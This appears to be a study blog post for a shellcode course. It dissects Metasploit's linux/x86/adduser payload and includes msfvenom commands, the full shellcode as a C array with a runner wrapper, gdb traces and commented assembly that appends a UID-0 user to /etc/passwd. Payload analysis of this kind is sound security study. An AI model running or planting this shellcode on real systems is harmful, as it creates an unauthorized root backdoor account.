---
layout: post
title: Metasploit Linux x86 adduser Analysis
tags: [slae]
---

The next assignment for the SLAE is analyzing three different Metasploit linux x86 payloads. For the first one we'll be going through the `linux/x86/adduser` payload and seeing exactly how it works. 

Let's first dive in by checking the payload options. 

```
root@kali:~# msfvenom -p linux/x86/adduser --payload-options
Options for payload/linux/x86/adduser:


       Name: Linux Add User
     Module: payload/linux/x86/adduser
   Platform: Linux
       Arch: x86
Needs Admin: Yes
 Total size: 97
       Rank: Normal

Provided by:
    skape <mmiller@hick.org>
    vlad902 <vlad902@gmail.com>
    spoonm <spoonm@no$email.com>

Basic options:
Name   Current Setting  Required  Description
----   ---------------  --------  -----------
PASS   metasploit       yes       The password for this user
SHELL  /bin/sh          no        The shell for this user
USER   metasploit       yes       The username to create

Description:
  Create a new user with UID 0
~
~
```

We can see there are two required options, USER and PASS. Let's run `msfvenom` with our custom parameters and pipe the payload into `ndisasm` to check out the assembly. 

```
root@kali:~# msfvenom -p linux/x86/adduser USER=absolomb PASS=supersecret -f raw | ndisasm -u -
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 95 bytes

00000000  31C9              xor ecx,ecx
00000002  89CB              mov ebx,ecx
00000004  6A46              push byte +0x46
00000006  58                pop eax
00000007  CD80              int 0x80
00000009  6A05              push byte +0x5
0000000B  58                pop eax
0000000C  31C9              xor ecx,ecx
0000000E  51                push ecx
0000000F  6873737764        push dword 0x64777373
00000014  682F2F7061        push dword 0x61702f2f
00000019  682F657463        push dword 0x6374652f
0000001E  89E3              mov ebx,esp
00000020  41                inc ecx
00000021  B504              mov ch,0x4
00000023  CD80              int 0x80
00000025  93                xchg eax,ebx
00000026  E826000000        call 0x51
0000002B  61                popa
0000002C  62736F            bound esi,[ebx+0x6f]
0000002F  6C                insb
00000030  6F                outsd
00000031  6D                insd
00000032  623A              bound edi,[edx]
00000034  41                inc ecx
00000035  7A33              jpe 0x6a
00000037  672E7A62          cs jpe 0x9d
0000003B  7139              jno 0x76
0000003D  637237            arpl [edx+0x37],si
00000040  633A              arpl [edx],di
00000042  303A              xor [edx],bh
00000044  303A              xor [edx],bh
00000046  3A2F              cmp ch,[edi]
00000048  3A2F              cmp ch,[edi]
0000004A  62696E            bound ebp,[ecx+0x6e]
0000004D  2F                das
0000004E  7368              jnc 0xb8
00000050  0A598B            or bl,[ecx-0x75]
00000053  51                push ecx
00000054  FC                cld
00000055  6A04              push byte +0x4
00000057  58                pop eax
00000058  CD80              int 0x80
0000005A  6A01              push byte +0x1
0000005C  58                pop eax
0000005D  CD80              int 0x80
```

Everything looks pretty straight forward until we see a lot of weird instructions starting around `0000002B`. We can see a total of four interrupts being called. To help analyze further let's put this through GDB. To do this we'll first extract our shellcode and place in a simple C wrapper. 


```
root@kali:~# msfvenom -p linux/x86/adduser USER=absolomb PASS=supersecret -f c
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 95 bytes
Final size of c file: 425 bytes
unsigned char buf[] = 
"\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51"
"\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63"
"\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x26\x00\x00\x00\x61\x62"
"\x73\x6f\x6c\x6f\x6d\x62\x3a\x41\x7a\x33\x67\x2e\x7a\x62\x71"
"\x39\x63\x72\x37\x63\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62"
"\x69\x6e\x2f\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80"
"\x6a\x01\x58\xcd\x80";
```

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51"
"\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63"
"\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x26\x00\x00\x00\x61\x62"
"\x73\x6f\x6c\x6f\x6d\x62\x3a\x41\x7a\x33\x67\x2e\x7a\x62\x71"
"\x39\x63\x72\x37\x63\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62"
"\x69\x6e\x2f\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80"
"\x6a\x01\x58\xcd\x80";
main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
```

Now we can compile.
```
root@kali:~/SLAE# gcc shellcode.c -o shellcode -fno-stack-protector -z execstack
```

Let's test to make sure our shellcode actually works as intended.

```
root@kali:~/SLAE# ./shellcode 
Shellcode Length:  40
root@kali:~/SLAE# cat /etc/passwd | grep absolomb
absolomb:Az3g.zbq9cr7c:0:0::/:/bin/sh
```

And we can see that our new user has indeed been added to /etc/passwd. 

Let's fire up GDB. Along with it we'll also be using PEDA to make things even easier.

We'll first set a breakpoint at `code` which is the start of our shellcode. 

```
root@kali:~/SLAE# gdb -q ./shellcode
gdb-peda$ break *&code
Breakpoint 1 at 0x2040
gdb-peda$ r
Starting program: /root/SLAE/shellcode 
Shellcode Length:  40

[----------------------------------registers-----------------------------------]
EAX: 0x402040 --> 0xcb89c931 
EBX: 0x402000 --> 0x1efc 
ECX: 0x16 
EDX: 0xb7fa4870 --> 0x0 
ESI: 0x1 
EDI: 0xb7fa3000 --> 0x1b9db0 
EBP: 0xbffff388 --> 0x0 
ESP: 0xbffff36c --> 0x40059d (<main+80>:	mov    eax,0x0)
EIP: 0x402040 --> 0xcb89c931
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x40203a:	add    BYTE PTR [eax],al
   0x40203c:	add    BYTE PTR [eax],al
   0x40203e:	add    BYTE PTR [eax],al
=> 0x402040 <code>:	xor    ecx,ecx
   0x402042 <code+2>:	mov    ebx,ecx
   0x402044 <code+4>:	push   0x46
   0x402046 <code+6>:	pop    eax
   0x402047 <code+7>:	int    0x80
[------------------------------------stack-------------------------------------]
0000| 0xbffff36c --> 0x40059d (<main+80>:	mov    eax,0x0)
0004| 0xbffff370 --> 0x1 
0008| 0xbffff374 --> 0xbffff434 --> 0xbffff5c1 ("/root/SLAE/shellcode")
0012| 0xbffff378 --> 0xbffff43c --> 0xbffff5d6 ("LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc"...)
0016| 0xbffff37c --> 0x402040 --> 0xcb89c931 
0020| 0xbffff380 --> 0xbffff3a0 --> 0x1 
0024| 0xbffff384 --> 0x0 
0028| 0xbffff388 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
```

Let's disassemble.

```
Breakpoint 1, 0x00402040 in code ()
gdb-peda$ disas
Dump of assembler code for function code:
=> 0x00402040 <+0>:	xor    ecx,ecx
   0x00402042 <+2>:	mov    ebx,ecx
   0x00402044 <+4>:	push   0x46
   0x00402046 <+6>:	pop    eax
   0x00402047 <+7>:	int    0x80
   0x00402049 <+9>:	push   0x5
   0x0040204b <+11>:	pop    eax
   0x0040204c <+12>:	xor    ecx,ecx
   0x0040204e <+14>:	push   ecx
   0x0040204f <+15>:	push   0x64777373
   0x00402054 <+20>:	push   0x61702f2f
   0x00402059 <+25>:	push   0x6374652f
   0x0040205e <+30>:	mov    ebx,esp
   0x00402060 <+32>:	inc    ecx
   0x00402061 <+33>:	mov    ch,0x4
   0x00402063 <+35>:	int    0x80
   0x00402065 <+37>:	xchg   ebx,eax
   0x00402066 <+38>:	call   0x402091 <code+81>
   0x0040206b <+43>:	popa   
   0x0040206c <+44>:	bound  esi,QWORD PTR [ebx+0x6f]
   0x0040206f <+47>:	ins    BYTE PTR es:[edi],dx
   0x00402070 <+48>:	outs   dx,DWORD PTR ds:[esi]
   0x00402071 <+49>:	ins    DWORD PTR es:[edi],dx
   0x00402072 <+50>:	bound  edi,QWORD PTR [edx]
   0x00402074 <+52>:	inc    ecx
   0x00402075 <+53>:	jp     0x4020aa
   0x00402077 <+55>:	addr16 cs jp 0x4020dd
   0x0040207b <+59>:	jno    0x4020b6
   0x0040207d <+61>:	arpl   WORD PTR [edx+0x37],si
   0x00402080 <+64>:	arpl   WORD PTR [edx],di
   0x00402082 <+66>:	xor    BYTE PTR [edx],bh
   0x00402084 <+68>:	xor    BYTE PTR [edx],bh
   0x00402086 <+70>:	cmp    ch,BYTE PTR [edi]
   0x00402088 <+72>:	cmp    ch,BYTE PTR [edi]
   0x0040208a <+74>:	bound  ebp,QWORD PTR [ecx+0x6e]
   0x0040208d <+77>:	das    
   0x0040208e <+78>:	jae    0x4020f8
   0x00402090 <+80>:	or     bl,BYTE PTR [ecx-0x75]
   0x00402093 <+83>:	push   ecx
   0x00402094 <+84>:	cld    
   0x00402095 <+85>:	push   0x4
   0x00402097 <+87>:	pop    eax
   0x00402098 <+88>:	int    0x80
   0x0040209a <+90>:	push   0x1
   0x0040209c <+92>:	pop    eax
   0x0040209d <+93>:	int    0x80
   0x0040209f <+95>:	add    BYTE PTR [eax],al
End of assembler dump.
```
We can see we have the same output from disassembling as we got from `ndisasm`. Let's take a look at the setup right before our first interrupt is called at address `0x00402047`.  


## setreuid()

Let's take a look at the assembly which setups our first interrupt:

```nasm
xor    ecx,ecx
mov    ebx,ecx
push   0x46
pop    eax
int    0x80
push   0x5
```

Looking in GDB we can break right before the interrupt is executed.

```
[----------------------------------registers-----------------------------------]
EAX: 0x46 ('F')
EBX: 0x0 
ECX: 0x0 
EDX: 0xb7fa4870 --> 0x0 
ESI: 0x1 
EDI: 0xb7fa3000 --> 0x1b9db0 
EBP: 0xbffff388 --> 0x0 
ESP: 0xbffff36c --> 0x40059d (<main+80>:	mov    eax,0x0)
EIP: 0x402047 --> 0x56a80cd
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x402042 <code+2>:	mov    ebx,ecx
   0x402044 <code+4>:	push   0x46
   0x402046 <code+6>:	pop    eax
=> 0x402047 <code+7>:	int    0x80
   0x402049 <code+9>:	push   0x5
   0x40204b <code+11>:	pop    eax
   0x40204c <code+12>:	xor    ecx,ecx
   0x40204e <code+14>:	push   ecx
```


So we can see that EAX is setup with syscall 0x46 which translates to 70 in decimal format, along with EBX and ECX both containing 0's. 

We can check our syscall at `/usr/include/i386-linux-gnu/asm/unistd_32.h` which is defined as setreuid(). According to the man pages this sets real and effective user IDs of the calling process.

The format for that is `setreuid(uid_t ruid, uid_t euid);` which means the call here looks like this:

```
setreuid(0, 0)
```

Which means this is setting root permissions for both real and effective user ID.

## open()

Our next chunk of assembly looks like such:

```nasm
push   0x5			
pop    eax			
xor    ecx,ecx			
push   ecx			
push   0x64777373		
push   0x61702f2f		
push   0x6374652f	
mov    ebx,esp		
inc    ecx	
mov    ch,0x4		
int    0x80	
```

Let's check out the registers right before the interrupt is called. 


```
[----------------------------------registers-----------------------------------]
EAX: 0x5 
EBX: 0xbffff35c ("/etc//passwd")
ECX: 0x401 
EDX: 0xb7fa4870 --> 0x0 
ESI: 0x1 
EDI: 0xb7fa3000 --> 0x1b9db0 
EBP: 0xbffff388 --> 0x0 
ESP: 0xbffff35c ("/etc//passwd")
EIP: 0x402063 --> 0xe89380cd
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x40205e <code+30>:	mov    ebx,esp
   0x402060 <code+32>:	inc    ecx
   0x402061 <code+33>:	mov    ch,0x4
=> 0x402063 <code+35>:	int    0x80
   0x402065 <code+37>:	xchg   ebx,eax
   0x402066 <code+38>:	call   0x402091 <code+81>
   0x40206b <code+43>:	popa   
   0x40206c <code+44>:	bound  esi,QWORD PTR [ebx+0x6f]

```


EAX is populated with a 5 which is defined as open() in `/usr/include/i386-linux-gnu/asm/unistd_32.h`

We can see EBX is pointing to an memory address on the stack which contains `/etc//passwd`. The extra / is in there to make the string even for hexadecimal. This was setup by the three push calls:

```nasm
push   0x64777373		; "dwss"
push   0x61702f2f		; "ap//"
push   0x6374652f		; "cte/"
```

We can also see ECX has a value of 0x401 which sets our flags to `O_WRONLY|O_APPEND`, meaning write and read with append. So our final syscall here looks like such:

```
open("/etc//passwd", O_WRONLY|O_APPEND)
```

## write()

Next chunk of assembly:

```nasm
xchg   ebx,eax			
call   0x402091 <code+81>	
popa   			
bound  esi,QWORD PTR [ebx+0x6f]
ins    BYTE PTR es:[edi],dx
outs   dx,DWORD PTR ds:[esi]
ins    DWORD PTR es:[edi],dx
bound  edi,QWORD PTR [edx]
inc    ecx
jp     0x4020aa
addr16 cs jp 0x4020dd
jno    0x4020b6
arpl   WORD PTR [edx+0x37],si
arpl   WORD PTR [edx],di
xor    BYTE PTR [edx],bh
xor    BYTE PTR [edx],bh
cmp    ch,BYTE PTR [edi]
cmp    ch,BYTE PTR [edi]
bound  ebp,QWORD PTR [ecx+0x6e]
das    
jae    0x4020f8
or     bl,BYTE PTR [ecx-0x75]	
push   ecx		     	
cld			      
push   0x4		     	
pop    eax	
int    0x80	
```

The first thing that happens in this section is the return value from the open() syscall (stored in EAX) is preserved by doing an XCHG with EBX. Since EAX will get used for the next syscall, the file descriptor must be stored elsewhere. 

Right after that we see a CALL to a memory address further down or to code+81. The CALL here will push the next set of instructions to the stack. Looking at the instructions past it just looks like a bunch of garbage instructions, however if we examine the addresses in memory we see that this is actually the string to be written to our open file. 

Let's set a breakpoint at `0x402091`.

```
[----------------------------------registers-----------------------------------]
EAX: 0xbffff35c ("/etc//passwd")
EBX: 0x3 
ECX: 0x401 
EDX: 0xb7fa4870 --> 0x0 
ESI: 0x1 
EDI: 0xb7fa3000 --> 0x1b9db0 
EBP: 0xbffff388 --> 0x0 
ESP: 0xbffff358 --> 0x40206b ("absolomb:Az3g.zbq9cr7c:0:0::/:/bin/sh\nY\213Q\374j\004X̀j\001X̀")
EIP: 0x402091 --> 0xfc518b59
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
=> 0x402091 <code+81>:	pop    ecx
   0x402092 <code+82>:	mov    edx,DWORD PTR [ecx-0x4]
   0x402095 <code+85>:	push   0x4
   0x402097 <code+87>:	pop    eax
[------------------------------------stack-------------------------------------]
0000| 0xbffff358 --> 0x40206b ("absolomb:Az3g.zbq9cr7c:0:0::/:/bin/sh\nY\213Q\374j\004X̀j\001X̀")
```

As you can see on the stack is indeed the string to be written to /etc/passwd.

What's more interesting here is that looking at GDB PEDA, we can see the next instruction is a POP to ECX as well as a MOV into EDX. This POP will push our string into ECX. However just doing a regular disassemble we cannot see this instruction and it also does not show in `ndisasm`. I believe this is due to the length of our string and it's associated instructions not realigning up nicely for disassembly. 

Let's continue and break just before our next interrupt is called. 

```
[----------------------------------registers-----------------------------------]
EAX: 0x4 
EBX: 0x3 
ECX: 0x40206b ("absolomb:Az3g.zbq9cr7c:0:0::/:/bin/sh\nY\213Q\374j\004X̀j\001X̀")
EDX: 0x26 ('&')
ESI: 0x1 
EDI: 0xb7fa3000 --> 0x1b9db0 
EBP: 0xbffff388 --> 0x0 
ESP: 0xbffff35c ("/etc//passwd")
EIP: 0x402098 --> 0x16a80cd
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x402094 <code+84>:	cld    
   0x402095 <code+85>:	push   0x4
   0x402097 <code+87>:	pop    eax
=> 0x402098 <code+88>:	int    0x80
   0x40209a <code+90>:	push   0x1
   0x40209c <code+92>:	pop    eax
   0x40209d <code+93>:	int    0x80
   0x40209f <code+95>:	add    BYTE PTR [eax],al
```

Here we can see EAX is populated with a 4 which is the write() syscall. Our open file descriptor is still in EBX from earlier. Our string to write is in ECX, along with its length (38) in EDX. 

Essentially our syscall looks like this:

```
write(3, "absolomb:Az3g.zbq9cr7c:0:0::/:/bin/sh" , 38)
```

## exit()

Our last section is fairly short and simple.

```nasm
push   0x1
pop    eax	
int    0x80	
```

```
[----------------------------------registers-----------------------------------]
EAX: 0x1 
EBX: 0x3 
ECX: 0x40206b ("absolomb:Az3g.zbq9cr7c:0:0::/:/bin/sh\nY\213Q\374j\004X̀j\001X̀")
EDX: 0x26 ('&')
ESI: 0x1 
EDI: 0xb7fa3000 --> 0x1b9db0 
EBP: 0xbffff388 --> 0x0 
ESP: 0xbffff35c ("/etc//passwd")
EIP: 0x40209d --> 0x80cd
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x402098 <code+88>:	int    0x80
   0x40209a <code+90>:	push   0x1
   0x40209c <code+92>:	pop    eax
=> 0x40209d <code+93>:	int    0x80
   0x40209f <code+95>:	add    BYTE PTR [eax],al
   0x4020a1:	add    BYTE PTR [eax],al
   0x4020a3:	add    BYTE PTR [eax],al
   0x4020a5:	add    BYTE PTR [eax],al
```


This last part is simply exiting the program, pushing the exit syscall (1) to the stack and popping it, then calling exit. The exit number stored in EBX really doesn't matter here so whatever is left from EBX is the code returned, which is a 3. 

```
exit(3)
```

## Final Commented Assembly

```nasm
xor    ecx,ecx			; set ecx to zero
mov    ebx,ecx			; move zero into ebx
push   0x46			; syscall setreuid
pop    eax			; move setreuid into eax
int    0x80			; execute setreuid
push   0x5			; syscall open 
pop    eax			; 
xor    ecx,ecx			; clear ecx to 0
push   ecx			; 0 to stack
push   0x64777373		; "dwss"
push   0x61702f2f		; "ap//"
push   0x6374652f		; "cte/"
mov    ebx,esp			; point to stack
inc    ecx			; 
mov    ch,0x4			; O_WRONLY|O_APPEND
int    0x80			; execute open
xchg   ebx,eax			; store open file in ebx
call   0x402091 <code+81>	; call address 0x402091 which will push the string to the stack
popa   				; start of string to be written to file
bound  esi,QWORD PTR [ebx+0x6f]
ins    BYTE PTR es:[edi],dx
outs   dx,DWORD PTR ds:[esi]
ins    DWORD PTR es:[edi],dx
bound  edi,QWORD PTR [edx]
inc    ecx
jp     0x4020aa
addr16 cs jp 0x4020dd
jno    0x4020b6
arpl   WORD PTR [edx+0x37],si
arpl   WORD PTR [edx],di
xor    BYTE PTR [edx],bh
xor    BYTE PTR [edx],bh
cmp    ch,BYTE PTR [edi]
cmp    ch,BYTE PTR [edi]
bound  ebp,QWORD PTR [ecx+0x6e]
das    
jae    0x4020f8
or     bl,BYTE PTR [ecx-0x75]	; end of string to be written
push   ecx		     	; not really a push here, pop ecx starts shortly before followed by a mov
cld			        ; not really a cld here
push   0x4		     	; write() 
pop    eax			; 
int    0x80			; execute write()
push   0x1			; exit()
pop    eax			;
int    0x80			; execute exit()
```

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: <http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/>

Student ID: SLAE-1208

Github Repo: <https://github.com/absolomb/SLAE>